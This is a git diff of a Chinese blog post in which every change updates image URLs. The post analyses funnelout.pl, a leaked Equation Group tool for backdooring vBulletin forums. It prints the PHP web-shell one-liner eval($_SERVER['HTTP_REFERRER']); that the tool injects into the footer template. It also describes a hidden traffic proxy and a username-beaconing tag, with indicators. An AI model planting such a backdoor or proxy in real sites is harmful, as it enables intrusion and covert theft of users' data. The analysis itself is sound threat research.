@@ -121,7 +121,7 @@
     
     
 
-<script src="https://ob5vt1k7f.qnssl.com/pangu.js"></script>
+<script src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js"></script>
 
 <p>花了几天时间研究了一下Equation Group泄露的针对<code>vBulletin</code>论坛的定向攻击工具，期间非常感谢<a href="https://mp.weixin.qq.com/s/5WRXpljL7RFSPRQ2NdHhtA">风流@逢魔安全实验室</a>的帮助，最主要的动力也是在技术分享上听了这个课题，感觉非常有意思，于是搭了环境研究了利用过程，期间也踩了好几个坑，整个过程下来却感受到脚本作者扎实的代码功底和缜密的逻辑，虽然是“过时”的工具了却有很多值得学习的地方。另外，这个过程是参考<a href="https://paper.seebug.org/517/">Equation Group泄露工具之vBulletin无文件后门分析</a>进行的，只是把其中碰到的一些问题梳理一下，大家可以结合着看，希望能起到帮助。</p>
 
@@ -160,7 +160,7 @@
 
 <p>来看一下脚本的整体功能</p>
 
-<p><img src="https://ob5vt1k7f.qnssl.com/TbgPz" alt="funnelout.pl" /></p>
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/TbgPz" alt="funnelout.pl" /></p>
 
 <p><code>-op</code>参数展示了可以选择的操作，最主要的是<code>door</code>,<code>proxy</code>和<code>tag</code>功能，以及相应的<code>show</code>操作，我们也是选择这三部分功能进行分析</p>
 
@@ -170,46 +170,46 @@
 
 <p>这应该是脚本最简单粗暴的方法，直接在数据库中插入后门代码，之后通过HTTP请求中的<code>Referrer</code>字段发送指令，注意此处是<code>Referrer</code>而不是默认的<code>Referer</code>，隐蔽性非常好。</p>
 
-<p><img src="https://ob5vt1k7f.qnssl.com/uLFsU" alt="backdoor" /></p>
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/uLFsU" alt="backdoor" /></p>
 
 <p>看一下插入后门的方法(在脚本中打印了执行的sql语句来方便理解)，可以看到插入后门的操作对页脚模板插入了一段base64编码后的代码<code>eval($_SERVER[&quot;HTTP_REFERRER&quot;]);</code>，在页面渲染页脚部分时就会加载恶意代码，攻击者就可以通过<code>HTTP_REFERRER</code>字段下发指令，利用非常简单。我们来看一下它具体是如何实现的</p>
 
-<p><img src="https://ob5vt1k7f.qnssl.com/TPKug" alt="op_door" />
-<img src="https://ob5vt1k7f.qnssl.com/J1Q9m" alt="patch_db" /></p>
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/TPKug" alt="op_door" />
+<img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/J1Q9m" alt="patch_db" /></p>
 
 <p>很简单的逻辑，将base64编码后的一句话代码插入<code>template</code>表的<code>footer</code>模板下，在<code>global.php</code>调用过程中被加载执行。</p>
 
-<p><img src="https://ob5vt1k7f.qnssl.com/06Abt" alt="global.php" /></p>
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/06Abt" alt="global.php" /></p>
 
-<p><img src="https://ob5vt1k7f.qnssl.com/wSBon" alt="debug" /></p>
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/wSBon" alt="debug" /></p>
 
-<p><img src="https://ob5vt1k7f.qnssl.com/Eumco" alt="phpinfo" /></p>
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/Eumco" alt="phpinfo" /></p>
 
 <h4 id="proxy-功能分析">Proxy 功能分析</h4>
 
 <p>Proxy功能相对复杂一些，但也离不开对模板的操作，它涉及的是<code>header</code>模板</p>
 
-<p><img src="https://ob5vt1k7f.qnssl.com/gGsRT" alt="proxyTemplate" />
-<img src="https://ob5vt1k7f.qnssl.com/KS5ci" alt="op_proxy" /></p>
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/gGsRT" alt="proxyTemplate" />
+<img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/KS5ci" alt="op_proxy" /></p>
 
 <p>使用proxy时需要指定一个<code>tag</code>，而且tagurl需要符合正则表达式<code>/(.+?)\/.+?\/.+?\/(.+?)\/\d+\/(.+?)\/(.*)/</code>也就是<code>x.x.x.x/a/b/c/1/d/</code>的格式，这地方是个坑&hellip;</p>
 
 <p>指定tagurl生成相应的proxy代码</p>
 
-<p><img src="https://ob5vt1k7f.qnssl.com/1UrLg" alt="proxy" />
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1UrLg" alt="proxy" />
 解码后</p>
 
-<p><img src="https://ob5vt1k7f.qnssl.com/oXMfY" alt="proxy code" /></p>
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/oXMfY" alt="proxy code" /></p>
 
 <p><code>$fahost</code>就是我们指定的tag的ip。当满足if条件——请求路径中含有<code>/</code>且ip不是<code>64.38.3.50</code>时，<code>header</code>渲染过程中会加载这些php代码，构造一个请求发送给我们的tagUrl。值得注意的是这里不仅支持GET请求，同样支持POST请求，也就是说我们可以作为“中间人”的角色时刻监听着用户与论坛之间的通信，实现了真正意义上的代理，而且用户在这过程中完全无法察觉到，细思极恐&hellip;</p>
 
-<p><img src="https://ob5vt1k7f.qnssl.com/jEOhg" alt="proxy request" /></p>
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/jEOhg" alt="proxy request" /></p>
 
 <p>可以确定的是<code>64.38.3.50</code>这个ip一定与攻击组织有关，也许在测试的时候就将此ip排除在外，避免一些麻烦，同时这也是整个脚本泄露的唯一一个确定的ip。</p>
 
 <h4 id="tag-功能分析">Tag 功能分析</h4>
 
-<p><img src="https://ob5vt1k7f.qnssl.com/NXTqW" alt="op_tag" />
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/NXTqW" alt="op_tag" />
 Tag功能更加复杂，操作<code>navbar</code>模板，使用时有这么几个选项可以指定，<code>-tag</code>指定标记的url，<code>-nohttp</code>表示不自动加上<code>http://</code>，这种情况可以在正常访问时嵌入一个网站本身的url，<code>-f</code>Force，还有<code>ssl</code>选项，适用于https的情况。</p>
 
 <p>我们先用<code>-tag</code>指定一个<code>tag URL</code></p>
@@ -218,18 +218,18 @@ Tag功能更加复杂，操作<code>navbar</code>模板，使用时有这么几�
 
 <p>base64解码后的代码长这样</p>
 
-<p><img src="https://ob5vt1k7f.qnssl.com/kLa7C" alt="tag code" /></p>
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/kLa7C" alt="tag code" /></p>
 
 <p>当我们访问文章页面<code>http://127.0.0.1/vb3/showthread.php?p=1</code>或访问私信链接<code>http://127.0.0.1/vb3/private.php?do=showpm&amp;pmid=1</code>时，就会加载php代码，在<code>datastore</code>表生成一个“标签”——插入一个序列化后的<code>data</code>字段，类似<code>a:2:{i:0;i:1517970003;i:1;i:1;}</code>，其中最后的<code>i</code>是一个计数器，值在随机数[0,6]之间，每次访问页面时i值递减1，当i减到0时就会触发代码，向我们设置的<code>tag URL</code>发送用户名经过hex编码后的页面地址</p>
 
-<p><img src="https://ob5vt1k7f.qnssl.com/FgW6h" alt="tag code1" />
-<img src="https://ob5vt1k7f.qnssl.com/pkQsP" alt="61646d696e.html" />
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/FgW6h" alt="tag code1" />
+<img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/pkQsP" alt="61646d696e.html" />
 <img src="http://ob5vt1k7f.qnssl.com/qmk8S" alt="61646d696e req" />(此处便于理解换了一个tag URL，并且新建了61646d696e.html文件)</p>
 
 <p>同时<code>tag</code>减至<code>-1</code>并出于等待重置状态，当我们进行<code>reset</code>操作时就会清空这条“标签”数据</p>
 
-<p><img src="https://ob5vt1k7f.qnssl.com/0wgAc" alt="showTagged" />
-<img src="https://ob5vt1k7f.qnssl.com/szepl" alt="reset" /></p>
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/0wgAc" alt="showTagged" />
+<img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/szepl" alt="reset" /></p>
 
 <p>值得注意的是，“标签”功能只在一天内有效，超过一天后就无法触发，只能先进行重置操作</p>
 
@@ -262,7 +262,7 @@ e6d290a03b70cfa5d4451da444bdea39 dbedd120e3d3cce1 (AR)
 
 <p>而根据另一个特殊的字符串<code>l9ed39e2fea93e5</code>搜索，发现网上存在可能被攻击的案例，里面出现了一个域名<code>http://technology-revealed.com</code></p>
 
-<p><img src="https://ob5vt1k7f.qnssl.com/OFkMN" alt="technology-revealed" /></p>
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/OFkMN" alt="technology-revealed" /></p>
 
 <p>这几条线索之间的关系不得而知，或许对威胁情报能起到一起参考作用，虽然这个APT攻击已经过去好多年了。</p>
 
